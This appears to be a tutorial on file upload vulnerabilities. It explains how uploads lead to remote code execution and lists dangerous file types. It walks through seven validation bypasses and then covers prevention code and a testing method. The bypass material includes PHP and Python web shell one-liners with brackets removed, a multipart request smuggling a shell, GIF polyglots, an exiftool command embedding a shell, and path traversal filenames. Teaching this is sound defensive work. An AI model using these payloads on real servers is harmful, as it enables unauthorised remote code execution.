==A file upload vulnerability occurs when an application allows users to upload files that the server processes or executes in an unsafe way, enabling attackers to abuse the upload functionality.==

A file upload vulnerability becomes critical when uploaded files are executed or trusted by the server.
    **Executed** â†’ leads to RCE (highest impact)
    **Trusted** â†’ leads to XSS, file inclusion, data leaks, logic abuse

A file upload vulnerability happens when a web application lets users upload files without properly checking what the file really is.

File upload vulnerability occurs when:

    Application allows users to upload files
    Insufficient validation of uploaded files
    Attacker uploads malicious files
    Server executes or serves the malicious file

#### How File Upload Works
**Visual Explanation**
```
NORMAL UPLOAD:

â”Œâ”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”     â”Œâ”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”     â”Œâ”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”
â”‚  User    â”‚â”€â”€â”€â”€â–ºâ”‚  Server  â”‚â”€â”€â”€â”€â–ºâ”‚  Storage â”‚
â”‚          â”‚     â”‚ Validatesâ”‚     â”‚          â”‚
â”‚ photo.jpgâ”‚     â”‚ âœ“ Valid  â”‚     â”‚ photo.jpgâ”‚
â””â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”˜     â””â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”˜     â””â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”˜


MALICIOUS UPLOAD:

â”Œâ”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”     â”Œâ”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”     â”Œâ”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”
â”‚ Attacker â”‚â”€â”€â”€â”€â–ºâ”‚  Server  â”‚â”€â”€â”€â”€â–ºâ”‚  Storage â”‚
â”‚          â”‚     â”‚ Fails to â”‚     â”‚          â”‚
â”‚ shell.phpâ”‚     â”‚ validate â”‚     â”‚ shell.phpâ”‚
â””â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”˜     â””â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”˜     â””â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”˜
                                        â”‚
                                        â–¼
                                  â”Œâ”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”
                                  â”‚ Attacker â”‚
                                  â”‚ accesses â”‚
                                  â”‚ shell.phpâ”‚
                                  â”‚    â†“     â”‚
                                  â”‚   RCE!   â”‚
                                  â””â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”˜
```


```
Attacker uploads shell.php
        â†“
Server fails to validate properly
        â†“
Server saves to /uploads/shell.php
        â†“
Attacker visits /uploads/shell.php
        â†“
Server EXECUTES the PHP code
        â†“
Attacker has Remote Code Execution!
```

## Types of Malicious Files

#### Web Shells:

A web shell is a script that gives attacker control over the server.

#PHP-web-shell:
```php
?php system($_GET['cmd']); ?
add <> in starting and ending.
```
**Usage:**
```
https://target.com/uploads/shell.php?cmd=whoami
```

##### Python Web shell
```PYTHON
import os
## os.system(input()) ##
#clear both ## & ## from starting and ending
```
## Dangerous File Types

| Category              | File Type         | Extensions                         | Risk Level | Why Dangerous                    |
| --------------------- | ----------------- | ---------------------------------- | ---------- | -------------------------------- |
| Server-side scripts   | PHP               | `.php`, `.php5`, `.phtml`, `.phar` | ğŸ”´ High    | Executed by server â†’ RCE         |
| Server-side scripts   | ASP / ASP.NET     | `.asp`, `.aspx`                    | ğŸ”´ High    | Executed on IIS                  |
| Server-side scripts   | JSP               | `.jsp`                             | ğŸ”´ High    | Executed on Java servers         |
| Server-side scripts   | CGI / Scripts     | `.cgi`, `.pl`, `.py`               | ğŸ”´ High    | Can be executed                  |
| Bypass techniques     | Double extensions | `.php.jpg`, `.jsp.png`             | ğŸŸ  Medium  | Bypass weak filters              |
| Serialized / archives | Serialized files  | `.phar`, `.jar`                    | ğŸŸ  Medium  | Deserialization / code execution |
| Archives              | Compressed files  | `.zip`, `.tar`, `.gz`              | ğŸŸ  Medium  | Hide malicious content           |
| Client-side execution | HTML              | `.html`, `.htm`                    | ğŸŸ¡ Medium  | XSS, phishing                    |
| Client-side execution | SVG               | `.svg`                             | ğŸŸ¡ Medium  | Embedded JavaScript              |
| Client-side execution | JavaScript        | `.js`                              | ğŸŸ¡ Medium  | Session attacks                  |
| Sensitive files       | Environment files | `.env`                             | ğŸŸ£ Medium  | Secret leakage                   |
| Sensitive files       | Config files      | `.ini`, `.conf`, `.yaml`           | ğŸŸ£ Medium  | Misconfiguration                 |
| Server config         | Web server config | `.htaccess`, `web.config`          | ğŸŸ£ Medium  | Change server behavior           |
| Backup / source       | Backup files      | `.bak`, `.old`, `.swp`             | ğŸŸ£ Medium  | Source code disclosure           |
| Usually safe          | Images            | `.jpg`, `.png`, `.gif`             | ğŸŸ¢ Low     | Safe if validated                |
| Usually safe          | Documents         | `.pdf`, `.docx`                    | ğŸŸ¢ Low     | Safe if restricted               |


## Common Validation Bypasses

Developers try to block malicious uploads but often fail:

#### Bypass 1: Extension Blacklist

Developer's logic:
Block .php files

**Bypass:**
Use alternative extensions that PHP still executes:

```
shell.php5
shell.php4
shell.phtml
shell.phar
shell.phps
shell.pHp (case variation)
shell.php.jpg (double extension)
shell.php%00.jpg (null byte - older systems)
shell.php. (trailing dot)
shell.php  (trailing space)
```


#### Bypass 2: Content-Type Validation

Developer's logic:
Check Content-Type header must be image/jpeg


**Bypass:**
Change Content-Type to allowed value:
```
POST /upload HTTP/1.1
Content-Type: multipart/form-data; boundary=----Boundary

------Boundary
Content-Disposition: form-data; name="file"; filename="shell.php"
Content-Type: image/jpeg

?php system($_GET['cmd']); ? #add <>
------Boundary--
```

Server sees image/jpeg but file is still PHP!


#### Bypass 3: Magic Bytes Validation

Developer's logic:
Check file header bytes to verify file type

Magic bytes examples:

File Type	                   Magic Bytes (Hex)	            Magic Bytes (ASCII)
JPEG	                             FF D8 FF E0                    	Ã¿Ã˜Ã¿Ã 
PNG                                  89 50 4E 47                 	.PNG
GIF	                                  47 49 46 38	                 GIF8
PDF	                                  25 50 44 46	                 %PDF

**Bypass:**
Add magic bytes before your code:

```
GIF89a
?php system($_GET['cmd']); ? #add <>
```
Server sees GIF header but executes PHP!

#### Bypass 4: Extension Whitelist

Developer's logic:
Only allow .jpg, .png, .gif

**Bypass attempts:**

Double extension:
```
shell.jpg.php
shell.php.jpg
```


#### Bypass 5: File Size Validation

Developer's logic:
Limit file size to prevent large uploads

**Bypass:**
Use minimal web shell:
```
?=`$_GET[c]`? #add <>
```
Only 17 characters! Usage: ?c=whoami


#### Bypass 6: Image Dimension Validation
Developer's logic:
Check image has valid dimensions using getimagesize()

**Bypass:**
Create actual image with embedded code:

**Method 1 - Embed in EXIF:**
```
exiftool -Comment='?php system($_GET["cmd"]); ?' image.jpg
#add <> in php part.
```

**Method 2 - Create polyglot file:**
```
GIF89a
?php system($_GET['cmd']); ? #add <>
```

#### Bypass 7: Path Traversal in Filename
Filename:
```
../../../var/www/html/shell.php
....//....//....//var/www/html/shell.php
```
File saved outside upload directory!

## Prevention Methods

#### 1. Extension Whitelist (not blacklist):
**Allowlist file types:**

Allow only specific file types

Example: only .jpg, .png, .pdf
```python
ALLOWED_EXTENSIONS = {'png', 'jpg', 'jpeg', 'gif'}

def allowed_file(filename):
    return '.' in filename and \
           filename.rsplit('.', 1)[1].lower() in ALLOWED_EXTENSIONS
```

#### 2. Rename uploaded files:
```python
import uuid
new_filename = str(uuid.uuid4()) + '.jpg'
```

#### 3. Store outside web root:
Do NOT store uploads in public directories like:
```CSS
/var/www/html/uploads/
```
Why it works
Even if a .php file is uploaded:
    - It cannot be accessed via browser
    - It cannot be executed

```text
/var/uploads/  (not accessible via web)
instead of
/var/www/html/uploads/  (accessible via web)
```

#### 4. Validate file content:
What to do

Check magic bytes / file signature

Ensure file is truly an image or document
```python
from PIL import Image

def is_valid_image(file):
    try:
        img = Image.open(file)
        img.verify()
        return True
    except:
        return False
```

#### 5. Disable execution in upload directory:
**Configure server to never execute scripts in upload folders**

**Apache .htaccess:**
```
php_flag engine off
```

#### 6. Use CDN or separate domain:

Serve uploads from different domain so cookies aren't sent.

#### 7. Enforce file size limits
Restrict maximum upload size

**Why it works:**
    Prevents DoS attacks
    Limits abuse
#### 8. Validate MIME type (secondary check)
Check server-side MIME type
     Adds extra validation layer
## Testing Methodology

#### Step 1: Find upload functionality

#### Step 2: Upload normal file and note:

- Where file is stored
- How filename is handled
- What validations exist

#### Step 3: Test bypasses:

- Change extension
- Change Content-Type
- Add magic bytes
- Try path traversal
- Try double extensions

#### Step 4: Access uploaded file

#### Step 5: Confirm code execution